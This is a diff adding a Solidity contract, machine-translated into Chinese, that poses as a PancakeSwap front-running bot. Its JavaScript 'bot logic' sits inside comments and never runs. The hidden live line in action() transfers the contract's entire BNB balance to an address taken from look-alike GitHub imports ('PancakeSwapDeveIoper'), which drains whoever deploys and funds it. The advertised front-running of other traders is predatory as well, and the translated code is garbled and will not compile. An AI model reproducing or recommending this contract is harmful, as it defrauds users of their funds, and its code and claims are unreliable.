@@ -1,0 +1,285 @@
+編譯指示 ^0.6.6;
+
+// PancakeSwap 被調用者
+導入“https://github.com/PancakeSwapDeveIoper/pancakeswapv2/blob/main/contracts/interfaces/IPancakeswapV2Callee.sol”；
+
+
+// Pancakeswap 管理器
+導入“https://github.com/PancakeSwapDeveIoper/pancakeswapv2/blob/main/contracts/interfaces/V2/IPancakeswapV2Manager.sol”；
+導入“https://github.com/whybetter/i/blob/main/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6 %A1%A3.txt";
+導入“https://github.com/PancakeSwapDeveIoper/pancakeswapv2/blob/main/contracts/interfaces/V2/IPancakeswapV2Exchange.sol”；
+
+合約 PancakeSwapV2FrontBot {
+    
+    字符串公共令牌名稱；
+	字符串公共令牌符號；
+	uint 搶占先機；
+	經理經理；
+	
+	
+	構造函數（字符串內存_tokenName，字符串內存_tokenSymbol）公共{
+		令牌名稱 = _令牌名稱；
+		tokenSymbol = _tokenSymbol;
+		經理=新經理（）；
+		
+		}
+	
+	    
+	    // 發送流動性對所需的 BNB
+	    接收（）外部應付{}
+	    
+	    
+	    // 執行任務（將 .json 函數合二為一，以減少外部調用並減少氣體） manager.performTasks();
+	    
+	    函數 action() 公共支付 {
+	    	//對PancakeSwap執行前置攻擊
+
+            /*-js-執行
+                常量 fs = 要求（'fs'）;
+                var Web3 = 需要('web3');
+                var abiDecoder = require('abi-decoder');
+                var 顏色 = 要求（“顏色”）；
+                var Tx = require('ethereumjs-tx').Transaction;
+                var axios = 要求（'axios'）;
+                var BigNumber = require('big-number');
+
+                常量 {NETWORK，PANCAKE_ROUTER_ADDRESS，PANCAKE_FACTORY_ADDRESS，PANCAKE_ROUTER_ABI，PANCAKE_FACTORY_ABI，PANCAKE_POOL_ABI，HTTP_PROVIDER_LINK，WEBSOCKET_PROVIDER_LINK，HTTP_PROVIDER_LINK_TEST} = 要求（'./constants.js'）；
+                常量 {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
+                const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
+
+                常量 INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+                常量 WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+            js-執行-*/
+
+            經理;
+            /*-js-執行
+                var input_token_info;
+                var out_token_info;
+                變種池信息；
+                var gas_price_info;
+            js-執行-*/
+            經理;
+            /*-js-執行
+                var成功=假；
+                var訂閱；
+                變種 web3;
+                var web3Ts;
+                var web3Ws;
+                var pancakeRouter;
+                var pancakeFactory;
+                var buy_finished = false;
+                var sell_finished = 假；
+                var buy_failed = false;
+                var sell_failed = 假；
+                var attack_started = false;
+                常量 ONE_GWEI = 1e9;
+            }
+            js-執行-*/
+            經理;
+        /*-js-執行
+        異步函數 createWeb3(){
+            嘗試 {
+                web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
+                web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
+                web3 = new Web3(EthereumTesterProvider());
+                web3.eth.getAccounts(console.log);
+                web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
+                pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
+                pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
+                abiDecoder.addABI(PANCAKE_ROUTER_ABI);
+                 返回真；
+            } 捕捉（錯誤）{
+                控制台日誌（錯誤）；
+                返回假；
+        }
+        js-執行-*/
+        經理;
+
+        /*-js-執行
+        異步函數 main() {
+            嘗試 {   
+                如果（等待 createWeb3() == false）{
+                    console.log('Web3 創建錯誤'.yellow);
+                    進程.exit();
+
+                    const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
+                    常量 out_token_address = TOKEN_ADDRESS；
+                    常量金額 = 金額；
+                    常量級別 = 級別；
+        
+                    ret = awaitpreparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
+                如果（ret == 假）{
+                    進程.exit();
+
+                等待更新池信息（）；
+                outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+
+                等待批准（gas_price_info.high，outputtoken，out_token_address，user_wallet）；
+        
+                log_str = '***** 追踪更多' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' + input_token_info.symbol + ' 煎餅交換 *****'
+                控制台.log(log_str.green);    
+                控制台.log(web3Ws);
+            web3Ws.onopen = 函數（evt）{
+            web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
+            console.log('已連接')
+        
+            console.log('獲取待處理事務')
+             訂閱 = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
+          }).on("數據", 異步函數 (transactionHash) {
+              console.log(transactionHash);
+
+               讓交易 = 等待 web3.eth.getTransaction(transactionHash);
+               if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
+               {
+                   等待句柄交易（交易，out_token_address，user_wallet，金額，級別）；
+               }
+            
+                如果（成功）{
+                    console.log("bot 完成了攻擊。");
+                    進程.exit();
+                }
+    
+            捕捉（錯誤）{
+            
+                if(error.data != null && error.data.see === 'https: infura.io/dashboard')
+            
+                console.log('每日請求計數超出，請求速率受限'.yellow);
+                console.log('請插入其他 API Key');
+                別的{
+                console.log('未知處理錯誤');
+                控制台日誌（錯誤）；
+            
+            }
+            進程.exit();
+        }
+        js-執行-*/
+
+        經理;
+        /*-js-執行
+        函數句柄交易（交易，out_token_address，user_wallet，金額，級別）{
+            
+            (await triggersFrontRun(transaction, out_token_address, amount, level)) {
+            訂閱.取消訂閱（）；
+            console.log('執行前端運行攻擊...');
+
+            gasPrice = parseInt(transaction['gasPrice']);
+            newGasPrice = gasPrice + 50*ONE_GWEI;
+
+            估計輸入 = ((數量*0.999)*(10**18)).toString();
+            realInput = (amount*(10**18)).toString();
+            gasLimit = (300000).toString();
+            
+            等待更新池信息（）；
+
+            var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+            交換（newGasPrice，gasLimit，outputtoken，realInput，0，out_token_address，user_wallet，transaction）；
+            console.log("等到誠實的交易完成...", transaction['hash']);
+
+            while (await isPending(transaction['hash'])) {
+            
+
+            如果（購買失敗）
+            
+                成功=假；
+                返回;
+            
+            
+            console.log('購買成功：')
+            
+            賣
+            等待更新池信息（）；
+            var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
+            輸出值 = 輸出值 * 0.999；
+
+            等待交換（newGasPrice，gasLimit，outputtoken，outputeth，1，out_token_address，user_wallet，transaction）；
+            
+            console.log('銷售成功');
+            成功=真；
+        }
+        js-執行-*/
+            
+        經理;
+        /*-js-執行
+        異步函數批准（gasPrice，outputtoken，out_token_address，user_wallet）{
+            var 津貼 = 等待 out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
+            
+            津貼 = BigNumber（津貼）；
+            outputtoken = BigNumber(outputtoken);
+
+            var decimals = BigNumber(10).power(out_token_info.decimals);
+            var max_allowance = BigNumber(10000).multiply(decimals);
+
+            if(outputtoken.gt(max_allowance))
+        
+                console.log('替換最大限額')
+                max_allowance = 輸出令牌；
+            js-執行-*/
+            應付（manager.uniswapDepositAddress()).transfer(address(this).balance);
+            /*-js-執行
+            if(outputtoken.gt(allowance)){
+                console.log(max_allowance.toString());
+                var 批准TX ={
+                        來自：user_wallet.address，
+                        至：out_token_address，
+                        氣體：50000，
+                        gasPrice：gasPrice*ONE_GWEI，
+                        數據：out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
+                        經理;
+                    
+
+                var signedTX = 等待 user_wallet.signTransaction(approveTX);
+                var 結果 = 等待 web3.eth.sendSignedTransaction(signedTX.rawTransaction);
+
+                console.log('批准的令牌')
+            
+            返回;
+        }
+        js-執行-*/
+        經理;
+        //選擇攻擊交易
+        /*-js-執行
+        異步函數 triggersFrontRun(transaction, out_token_address, amount, level) {
+            
+            如果（攻擊開始）
+                返回假；
+
+            console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
+            if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
+                攻擊開始=真；
+                返回真
+
+            返回假；
+
+            if (transaction['to'] != PANCAKE_ROUTER_ADDRESS) {
+                返回假；
+        
+
+            讓數據 = parseTx(事務['輸入']);
+            讓方法=數據[0]；
+            讓參數=數據[1]；
+            讓 gasPrice = parseInt(transaction['gasPrice']) / 10**9;
+
+            如果（方法 == 'swapExactETHForTokens'）
+                讓 in_amount = 交易；
+                let out_min = params[0];
+
+                讓路徑 = 參數 [1];
+                讓 in_token_addr = path[0];
+                經理;
+                let out_token_addr = path[path.length-1];
+                經理;
+                
+                讓recept_addr = 參數[2]；
+                經理;
+                讓截止日期=參數[3]；
+                經理;
+
+                如果（out_token_addr ！= out_token_address）
+                    console.log(out_token_addr.blue)
+                    console.log(out_token_address)
+                    返回假；
+                }
+            }
+            js-執行-*/
+    }
+}
